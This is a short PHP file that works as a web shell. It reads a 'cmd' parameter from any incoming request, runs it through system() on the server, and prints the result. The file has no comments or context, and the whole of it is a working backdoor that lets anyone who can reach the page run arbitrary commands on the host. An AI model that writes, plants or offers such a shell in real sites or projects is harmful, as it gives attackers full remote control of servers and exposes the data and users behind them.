<?php
	if(isset($_REQUEST['cmd'])){
		echo "<pre>";
		system($_REQUEST["cmd"]);
		print_r(chdir("/"));
	}
?>